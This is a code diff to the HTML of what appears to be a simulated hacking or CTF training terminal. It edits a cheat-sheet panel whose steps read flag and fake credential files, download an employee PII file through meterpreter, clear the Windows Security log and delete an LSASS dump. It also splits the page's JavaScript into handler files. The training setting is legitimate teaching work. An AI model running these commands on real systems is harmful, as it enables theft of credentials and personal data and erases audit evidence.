@@ -347,17 +347,20 @@
           </div>
 
           <div class="mb-4">
-            <div class="text-emerald-400 text-[11px] tracking-wider mb-1.5">► 5. LOOT &amp; EXFIL</div>
+            <div class="text-emerald-400 text-[11px] tracking-wider mb-1.5">► 5. LOOT  <span class="text-slate-500 normal-case">(in <span class="text-amber-300">shell</span>)</span></div>
             <div class="pl-3 space-y-0.5">
               <div><span class="text-violet-400">type C:\Users\Administrator\Desktop\flag.txt</span></div>
               <div><span class="text-violet-400">type C:\CORP_DATA\Customer\Credit_Card_Records\root.txt</span></div>
               <div><span class="text-violet-400">type C:\CORP_DATA\IT\VPN_Credentials.txt</span></div>
+            </div>
+            <div class="text-emerald-400 text-[11px] tracking-wider mt-2 mb-1">  Exfil <span class="text-slate-500 normal-case">(in meterpreter — <span class="text-amber-300">exit</span> the cmd shell first)</span></div>
+            <div class="pl-3 space-y-0.5">
               <div><span class="text-violet-400">download C:\CORP_DATA\HR\All_Employees_PII.csv /tmp/pii.csv</span></div>
             </div>
           </div>
 
           <div class="mb-1">
-            <div class="text-emerald-400 text-[11px] tracking-wider mb-1.5">► 6. COVER TRACKS  <span class="text-slate-500 normal-case">(noisier than not)</span></div>
+            <div class="text-emerald-400 text-[11px] tracking-wider mb-1.5">► 6. COVER TRACKS  <span class="text-slate-500 normal-case">(in <span class="text-amber-300">shell</span> · noisier than not)</span></div>
             <div class="pl-3 space-y-0.5">
               <div><span class="text-violet-400">wevtutil cl Security</span> <span class="text-slate-500"># writes Event 1102 — itself logged</span></div>
               <div><span class="text-violet-400">del /f C:\Windows\Temp\lsass.dmp</span></div>
@@ -634,7 +637,14 @@
 
 <script src="https://cdn.jsdelivr.net/npm/xterm@4.19.0/lib/xterm.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/xterm-addon-fit@0.5.0/lib/xterm-addon-fit.js"></script>
-<script src="js/commands.js"></script>
+<script src="js/sim_state.js"></script>
+<script src="js/handlers/sudo_apt.js"></script>
+<script src="js/handlers/basic.js"></script>
+<script src="js/handlers/recon.js"></script>
+<script src="js/handlers/system.js"></script>
+<script src="js/handlers/msf.js"></script>
+<script src="js/handlers/misc.js"></script>
+<script src="js/dispatcher.js"></script>
 <script src="js/ctf.js"></script>
 <script src="js/terminal.js"></script>
 <script src="js/main.js"></script>
